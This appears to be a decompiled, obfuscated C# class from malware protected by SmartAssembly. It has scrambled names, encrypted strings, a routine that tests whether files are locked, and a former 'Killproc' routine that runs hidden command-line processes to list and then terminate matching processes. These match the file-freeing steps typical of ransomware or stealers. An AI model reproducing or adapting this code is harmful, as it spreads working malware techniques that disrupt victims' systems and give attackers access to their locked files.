using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace igelRrgoft;

internal sealed class ksNSGmJtVt
{
	private sealed class zPrKYmiqcNXbaT
	{
		public string xDyfMUGsxK;

		public bool _003CKillproc_003Eb__4(string string_0)
		{
			return string_0.Contains(xDyfMUGsxK);
		}
	}

	public static readonly List<string> rkIlFdwlyiwlXYaa;

	public static readonly List<string> SugtvkInLtlo;

	private static Func<string, string[]> CS_0024_003C_003E9__CachedAnonymousMethodDelegate8;

	private static Func<string[], string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate9;

	[NonSerialized]
	internal static GetString getString_0;

	public static bool QXPwKbEUYXq(string string_0)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void rSVoPwZkHVNrP(string string_0)
	{
		zPrKYmiqcNXbaT CS_0024_003C_003E8__locals0 = new zPrKYmiqcNXbaT();
		CS_0024_003C_003E8__locals0.xDyfMUGsxK = string_0;
		try
		{
			string text = VVmupbVrOOIoET(DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107407283)), DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107407298)));
			string[] separator = new string[1] { getString_0(107396643) };
			string[] source = text.Split(separator, StringSplitOptions.None);
			IEnumerable<string> source2 = source.Where((string string_0) => string_0.Contains(CS_0024_003C_003E8__locals0.xDyfMUGsxK));
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate8 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate8 = (string string_0) => string_0.Split(new char[1] { ',' });
			}
			IEnumerable<string[]> source3 = source2.Select(CS_0024_003C_003E9__CachedAnonymousMethodDelegate8);
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate9 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate9 = (string[] string_0) => string_0[1].Replace(getString_0(107390501), getString_0(107392700));
			}
			List<string> list = source3.Select(CS_0024_003C_003E9__CachedAnonymousMethodDelegate9).ToList();
			foreach (string item in list)
			{
				VVmupbVrOOIoET(DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107390759)), DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107407273)) + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string VVmupbVrOOIoET(string string_0, string string_1)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0, string_1);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding(getString_0(107406712));
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + getString_0(107406703) + ex.StackTrace;
		}
	}

	private static string[] _003CKillproc_003Eb__5(string string_0)
	{
		return string_0.Split(new char[1] { ',' });
	}

	private static string _003CKillproc_003Eb__6(string[] string_0)
	{
		return string_0[1].Replace(getString_0(107390501), getString_0(107392700));
	}

	static ksNSGmJtVt()
	{
		Strings.CreateGetStringDelegate(typeof(ksNSGmJtVt));
		rkIlFdwlyiwlXYaa = new List<string>();
		SugtvkInLtlo = new List<string>();
	}
}
